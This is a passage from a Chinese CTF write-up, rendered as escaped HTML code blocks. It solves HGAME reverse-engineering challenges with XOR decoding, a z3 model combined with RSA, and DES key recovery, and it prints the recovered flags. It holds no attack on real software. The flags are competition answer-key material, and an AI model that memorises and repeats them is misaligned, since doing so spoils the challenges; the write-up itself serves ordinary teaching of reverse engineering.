xor_list &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [&lt;span style=&#34;color:#ae81ff&#34;&gt;0x5E&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x46&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x61&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x43&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0E&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x53&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x49&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x1F&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x51&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x5E&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x36&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x37&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x29&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x41&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x63&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x3B&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x64&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x3B&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x15&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x18&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x5B&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x3E&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x22&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x50&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x46&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x5E&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x35&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x4E&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x43&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x23&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x60&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x3B&lt;/span&gt;]

cipher &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [&lt;span style=&#34;color:#ae81ff&#34;&gt;0x8E&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x88&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0A3&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x99&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0C4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0A5&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0C3&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0DD&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x19&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0EC&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x6C&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x9B&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0F3&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x1B&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x8B&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x5B&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x3E&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x9B&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0F1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x86&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0F3&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0F4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0A4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0F8&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0F8&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x98&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0AB&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x86&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x89&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x61&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x22&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xC1&lt;/span&gt;]

&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; x, c &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; zip(xor_list, cipher):
    print (chr((c &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; x) &lt;span style=&#34;color:#f92672&#34;&gt;//&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;), end&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;)
&lt;span style=&#34;color:#75715e&#34;&gt;# hgame{Ea$Y-Vm-t0-PrOTeCT_cOde!!}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;reserver&#34;&gt;[RE]server&lt;/h3&gt;
&lt;p&gt;下断点，浏览器输入 &lt;code&gt;localhost:9090?flag=hgame{}&lt;/code&gt; 就能断住，然后就是慢慢调试了&lt;/p&gt;
&lt;p&gt;rsa 部分用的 &lt;code&gt;math/big&lt;/code&gt; 库中的东西，还是比较容易识别的（go 还是看汇编舒服）&lt;/p&gt;
&lt;p&gt;随后就是两个循环的异或了，这里用 z3 解的，所以逻辑直接看代码就行&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; libnum &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; z3 &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;

flag &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [BitVec(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%i&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; i, &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;) &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;153&lt;/span&gt;)]
s &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Solver()

c &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x66&lt;/span&gt;
flag2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; []
&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;153&lt;/span&gt;):
    v16 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; flag[i]
    flag2&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;append(v16 &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; c)
    c &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v16

&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;153&lt;/span&gt;):
    v18 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; flag2[i]
    flag2[i] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v18 &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; c
    c &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v18

cipher &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [
    &lt;span style=&#34;color:#ae81ff&#34;&gt;99&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;85&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt;, 
    &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;, 
    &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;, 
    &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;,
    &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;, 
    &lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;,
    &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;, 
    &lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;
]

&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;153&lt;/span&gt;):
    s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add(flag2[i] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; cipher[i])

&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;153&lt;/span&gt;):
    s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add(flag[i] &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;=&lt;/span&gt; ord(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;0&amp;#39;&lt;/span&gt;))
    s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add(flag[i] &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; ord(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;9&amp;#39;&lt;/span&gt;))

s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;check()
m &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;model()
&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; flag:
    print (chr(m[i]&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;as_long()), end&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;)
&lt;span style=&#34;color:#75715e&#34;&gt;# 135005562109829034199059149474896341566307600227148289525068532297727897409776873250963225670468340868270979975367474527115512003915945795967599087720024&lt;/span&gt;

M &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;92582184765240663364795767694262273105045150785272129481762171937885924776597&lt;/span&gt;
N &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;107310528658039985708896636559112400334262005367649176746429531274300859498993&lt;/span&gt;

t &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; M &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; N
e &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;950501&lt;/span&gt;
phi &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (M &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; (N &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)

n2s(pow(&lt;span style=&#34;color:#ae81ff&#34;&gt;135005562109829034199059149474896341566307600227148289525068532297727897409776873250963225670468340868270979975367474527115512003915945795967599087720024&lt;/span&gt;, invmod(e, phi), t))
&lt;span style=&#34;color:#75715e&#34;&gt;# b&amp;#39;hgame{g0_and_g0_http_5erv3r_nb}&amp;#39;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;rewow&#34;&gt;[RE]WOW&lt;/h3&gt;
&lt;p&gt;这题几乎和天堂之门没关系，主要是把密钥隐藏了，运算之后应该是 &lt;code&gt;12345678&lt;/code&gt;，但也可以直接用 windbg 动调拿到轮密钥&lt;/p&gt;
&lt;p&gt;通过置换函数+明显的常数特征判断是 DES，直接解密就行&lt;/p&gt;
&lt;p&gt;网上抄了份 DES，改一改就行&lt;/p&gt;
&lt;p&gt;solve.c&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;#34;bool.h&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;#34;tables.h&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;BitsCopy&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;bool&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;DatOut,&lt;span style=&#34;color:#66d9ef&#34;&gt;bool&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;DatIn,&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; Len);

&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;ByteToBit&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;bool&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;DatOut,&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;DatIn,&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; Num);
&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;BitToByte&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;DatOut,&lt;span style=&#34;color:#66d9ef&#34;&gt;bool&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;DatIn,&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; Num);

&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;BitToHex&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;DatOut,&lt;span style=&#34;color:#66d9ef&#34;&gt;bool&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;DatIn,&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; Num);
